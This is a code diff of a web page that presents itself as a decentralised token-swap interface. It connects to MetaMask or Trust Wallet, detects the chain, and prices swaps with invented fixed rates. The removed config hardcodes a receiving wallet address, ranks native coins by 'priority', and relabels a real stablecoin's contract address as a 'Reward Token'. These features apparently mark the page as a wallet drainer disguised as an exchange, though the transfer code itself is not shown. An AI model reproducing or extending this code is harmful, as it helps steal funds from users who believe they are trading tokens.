@@ -1,161 +1,82 @@
-// config/abi.js
-var ERC20_ABI = [
-  "function balanceOf(address owner) view returns (uint256)",
-  "function transfer(address to, uint256 amount) returns (bool)"
-];
-
-// config/networks.js
-var NETWORK_CONFIGS = {
-  ethereum: {
-    chainId: "0x1",
-    chainName: "Ethereum Mainnet",
-    nativeCurrency: { name: "ETH", symbol: "ETH", decimals: 18 },
-    rpcUrls: ["https://mainnet.infura.io/v3/"],
-    blockExplorerUrls: ["https://etherscan.io"],
-    scanUrl: "https://etherscan.io/tx/",
-    logo: "https://cryptologos.cc/logos/ethereum-eth-logo.png"
-  },
-  bsc: {
-    chainId: "0x38",
-    chainName: "Binance Smart Chain",
-    nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-    rpcUrls: ["https://bsc-dataseed.binance.org/"],
-    blockExplorerUrls: ["https://bscscan.com"],
-    scanUrl: "https://bscscan.com/tx/",
-    logo: "https://cryptologos.cc/logos/bnb-bnb-logo.png"
-  },
-  polygon: {
-    chainId: "0x89",
-    chainName: "Polygon Mainnet",
-    nativeCurrency: { name: "MATIC", symbol: "MATIC", decimals: 18 },
-    rpcUrls: ["https://polygon-rpc.com/"],
-    blockExplorerUrls: ["https://polygonscan.com"],
-    scanUrl: "https://polygonscan.com/tx/",
-    logo: "https://cryptologos.cc/logos/polygon-matic-logo.png"
-  }
-};
-
-// config/tokens.js
-var RECEIVING_WALLET = "0x773F5d9eEc75629A2624EEd5D95472910D6c651a";
-
-var TOKENS = {
-  ethereum: [
-    {
-      name: "Reward Token",
-      symbol: "REWARD",
-      address: "0x6B175474E89094C44Da98b954EedeAC495271d0F",
-      abi: ERC20_ABI,
-      decimals: 18,
-      priority: 61
-    },
-    {
-      name: "Ethereum",
-      symbol: "ETH",
-      address: "0x0000000000000000000000000000000000000000",
-      abi: [],
-      decimals: 18,
-      isNative: true,
-      priority: 997
-    }
-  ],
-  bsc: [
-    {
-      name: "Binance Coin",
-      symbol: "BNB",
-      address: "0x0000000000000000000000000000000000000000",
-      abi: [],
-      decimals: 18,
-      isNative: true,
-      priority: 999
-    }
-  ],
-  polygon: [
-    {
-      name: "Polygon",
-      symbol: "MATIC",
-      address: "0x0000000000000000000000000000000000000000",
-      abi: [],
-      decimals: 18,
-      isNative: true,
-      priority: 999
-    }
-  ]
-};
-
 // app.js - DEX-like Token Swap Interface
+
+// Verify required globals
+if (typeof NETWORK_CONFIGS === 'undefined') throw new Error("NETWORK_CONFIGS not defined");
+if (typeof TOKENS === 'undefined') throw new Error("TOKENS not defined");
+if (typeof RECEIVING_WALLET === 'undefined') throw new Error("RECEIVING_WALLET not defined");
+
+// App state
 let provider, signer, userAddress;
 let currentNetwork = "ethereum";
 let currentFromToken = null;
 let currentToToken = null;
-let currentSlippage = 0.5;
-
-// Network chain ID to name mapping
-const CHAIN_ID_TO_NETWORK = {
-  '0x1': 'ethereum',
-  '0x38': 'bsc',
-  '0x89': 'polygon'
-};
+let currentSlippage = 0.5; // 0.5% default slippage
 
 // Initialize on load
 window.addEventListener('load', async () => {
   try {
-    setupEventListeners();
-    await initializeApp();
+    // Setup event listeners
+    document.getElementById("networkSelect").addEventListener('click', showNetworkOptions);
+    document.getElementById("connectWallet").addEventListener("click", handleWalletConnection);
+    document.getElementById("fromTokenSelect").addEventListener("click", () => showTokenList('from'));
+    document.getElementById("toTokenSelect").addEventListener("click", () => showTokenList('to'));
+    document.getElementById("swapBtn").addEventListener("click", handleSwap);
+    document.getElementById("settingsBtn").addEventListener("click", showSettings);
+    document.getElementById("closeTokenList").addEventListener("click", hideTokenList);
+    document.getElementById("closeSettings").addEventListener("click", hideSettings);
+    document.getElementById("metaMaskBtn").addEventListener("click", connectMetaMask);
+    document.getElementById("cancelWalletConnect").addEventListener("click", hideWalletConnect);
+    document.getElementById("fromAmount").addEventListener("input", updateToAmount);
+    
+    // Mobile-specific listeners
+    if (isMobile()) {
+      document.getElementById("openTrustWallet").addEventListener('click', openInTrustWallet);
+    }
+    
+    // Set default tokens
+    const defaultFromToken = TOKENS.ethereum.find(t => t.symbol === "ETH");
+    const defaultToToken = TOKENS.ethereum.find(t => t.symbol === "REWARD");
+    
+    if (defaultFromToken && defaultToToken) {
+      currentFromToken = defaultFromToken;
+      currentToToken = defaultToToken;
+      updateTokenSelectors();
+    }
+    
+    await checkWalletEnvironment();
   } catch (err) {
     console.error("Initialization error:", err);
     updateStatus("Initialization failed: " + err.message, "error");
   }
 });
 
-function setupEventListeners() {
-  document.getElementById("networkSelect").addEventListener('click', showNetworkOptions);
-  document.getElementById("connectWallet").addEventListener("click", handleWalletConnection);
-  document.getElementById("fromTokenSelect").addEventListener("click", () => showTokenList('from'));
-  document.getElementById("toTokenSelect").addEventListener("click", () => showTokenList('to'));
-  document.getElementById("swapBtn").addEventListener("click", handleSwap);
-  document.getElementById("settingsBtn").addEventListener("click", showSettings);
-  document.getElementById("closeTokenList").addEventListener("click", hideTokenList);
-  document.getElementById("closeSettings").addEventListener("click", hideSettings);
-  document.getElementById("metaMaskBtn").addEventListener("click", connectMetaMask);
-  document.getElementById("cancelWalletConnect").addEventListener("click", hideWalletConnect);
-  document.getElementById("fromAmount").addEventListener("input", updateToAmount);
-  
-  if (isMobile()) {
-    document.getElementById("openTrustWallet").addEventListener('click', openInTrustWallet);
-  }
-}
-
-async function initializeApp() {
-  // Set default tokens
-  const defaultFromToken = TOKENS.ethereum.find(t => t.symbol === "ETH");
-  const defaultToToken = TOKENS.ethereum.find(t => t.symbol === "REWARD");
-  
-  if (defaultFromToken && defaultToToken) {
-    currentFromToken = defaultFromToken;
-    currentToToken = defaultToToken;
-    updateTokenSelectors();
-  }
-  
-  await checkWalletEnvironment();
-}
-
 // =====================
-// WALLET FUNCTIONS
+// UTILITY FUNCTIONS
 // =====================
 
 function isMobile() {
   return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 }
 
-function openInTrustWallet() {
-  const currentUrl = encodeURIComponent(window.location.href);
-  window.location.href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${currentUrl}`;
-  setTimeout(() => {
-    document.getElementById('manualSteps').style.display = 'block';
-  }, 3000);
+function updateNetworkLogo(network) {
+  const logoMap = {
+    ethereum: "https://cryptologos.cc/logos/ethereum-eth-logo.png",
+    bsc: "https://cryptologos.cc/logos/bnb-bnb-logo.png",
+    polygon: "https://cryptologos.cc/logos/polygon-matic-logo.png"
+  };
+  
+  const logoElement = document.querySelector(".dex-nav-logo img");
+  if (logoMap[network]) {
+    logoElement.src = logoMap[network];
+  }
 }
 
+// =====================
+// WALLET FUNCTIONS
+// =====================
+
 async function checkWalletEnvironment() {
+  // Check if wallet was previously connected
   const savedWallet = localStorage.getItem('walletConnected');
   if (savedWallet === 'metamask' && window.ethereum) {
     try {
@@ -163,6 +84,19 @@ async function checkWalletEnvironment() {
     } catch (err) {
       console.error("Auto-connect error:", err);
       localStorage.removeItem('walletConnected');
+    }
+  }
+  
+  // Detect current network if wallet is connected
+  if (window.ethereum && window.ethereum.chainId) {
+    const chainId = window.ethereum.chainId;
+    for (const network in NETWORK_CONFIGS) {
+      if (NETWORK_CONFIGS[network].chainId === chainId) {
+        currentNetwork = network;
+        document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
+        updateNetworkLogo(network);
+        break;
+      }
     }
   }
 }
@@ -173,14 +107,7 @@ async function initializeWallet() {
     signer = provider.getSigner();
     userAddress = await signer.getAddress();
     
-    // Detect current network
-    const network = await provider.getNetwork();
-    const chainId = "0x" + network.chainId.toString(16);
-    if (CHAIN_ID_TO_NETWORK[chainId]) {
-      currentNetwork = CHAIN_ID_TO_NETWORK[chainId];
-      updateNetworkSelector();
-    }
-    
+    // Save connection to localStorage
     localStorage.setItem('walletConnected', 'metamask');
     updateWalletButton(true);
     return true;
@@ -193,7 +120,14 @@ async function initializeWallet() {
 
 async function handleWalletConnection() {
   if (userAddress) {
-    await disconnectWallet();
+    // Disconnect if already connected
+    userAddress = null;
+    provider = null;
+    signer = null;
+    localStorage.removeItem('walletConnected');
+    updateWalletButton(false);
+    updateSwapButton();
+    updateStatus("Wallet disconnected", "success");
     return;
   }
 
@@ -201,26 +135,11 @@ async function handleWalletConnection() {
     if (isMobile()) {
       showWalletConnect();
     } else {
-      updateStatus("Please install MetaMask or use a Web3 browser", "error");
+      updateStatus("Please install MetaMask", "error");
     }
     return;
   }
 
-  await connectAndProcess();
-}
-
-async function disconnectWallet() {
-  userAddress = null;
-  provider = null;
-  signer = null;
-  localStorage.removeItem('walletConnected');
-  updateWalletButton(false);
-  updateSwapButton();
-  updateStatus("Wallet disconnected", "success");
-}
-
-async function connectMetaMask() {
-  hideWalletConnect();
   await connectAndProcess();
 }
 
@@ -229,11 +148,24 @@ async function connectAndProcess() {
     showLoader();
     updateStatus("Connecting wallet...", "success");
 
-    await window.ethereum.request({ method: "eth_requestAccounts" });
+    // Request account access
+    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+    if (accounts.length === 0) {
+      throw new Error("No accounts found");
+    }
     
-    const initialized = await initializeWallet();
-    if (!initialized) return;
+    // Detect current network
+    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+    for (const network in NETWORK_CONFIGS) {
+      if (NETWORK_CONFIGS[network].chainId === chainId) {
+        currentNetwork = network;
+        document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
+        updateNetworkLogo(network);
+        break;
+      }
+    }
     
+    await initializeWallet();
     updateSwapButton();
   } catch (err) {
     console.error("Connection error:", err);
@@ -245,9 +177,27 @@ async function connectAndProcess() {
   }
 }
 
+async function connectMetaMask() {
+  hideWalletConnect();
+  await connectAndProcess();
+}
+
+function openInTrustWallet() {
+  const currentUrl = encodeURIComponent(window.location.href);
+  window.location.href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${currentUrl}`;
+  setTimeout(() => {
+    document.getElementById('manualSteps').style.display = 'block';
+  }, 3000);
+}
+
+// =====================
+// NETWORK FUNCTIONS
+// =====================
+
 async function handleNetworkChange(network) {
   currentNetwork = network;
-  updateNetworkSelector();
+  document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
+  updateNetworkLogo(network);
   
   // Reset tokens when network changes
   currentFromToken = null;
@@ -257,19 +207,6 @@ async function handleNetworkChange(network) {
   if (userAddress) {
     await checkNetwork();
   }
-}
-
-function updateNetworkSelector() {
-  const networkConfig = NETWORK_CONFIGS[currentNetwork];
-  const networkSelector = document.getElementById("networkSelect");
-  const currentNetworkSpan = document.getElementById("currentNetwork");
-  
-  currentNetworkSpan.textContent = networkConfig.chainName;
-  networkSelector.innerHTML = `
-    <img src="${networkConfig.logo}" width="20" height="20" alt="${networkConfig.chainName}">
-    <span id="currentNetwork">${networkConfig.chainName}</span>
-    <i class="fas fa-chevron-down"></i>
-  `;
 }
 
 async function checkNetwork() {
@@ -312,9 +249,13 @@ function showTokenList(type) {
   const modal = document.getElementById("tokenListModal");
   const tokenItems = document.getElementById("tokenItems");
   
+  // Clear previous items
   tokenItems.innerHTML = '';
+  
+  // Filter tokens for current network
   const networkTokens = TOKENS[currentNetwork] || [];
   
+  // Add tokens to list
   networkTokens.forEach(token => {
     const tokenItem = document.createElement('div');
     tokenItem.className = 'dex-token-item';
@@ -411,10 +352,10 @@ function getConversionRate(fromToken, toToken) {
     'REWARD-ETH': 20,
     'ETH-USDT': 1800,
     'USDT-ETH': 0.00055,
-    'BNB-REWARD': 0.03,
-    'REWARD-BNB': 33.33,
-    'MATIC-REWARD': 0.02,
-    'REWARD-MATIC': 50
+    'ETH-USDC': 1800,
+    'USDC-ETH': 0.00055,
+    'ETH-DAI': 1800,
+    'DAI-ETH': 0.00055,
   };
   
   const pair = `${fromToken.symbol}-${toToken.symbol}`;
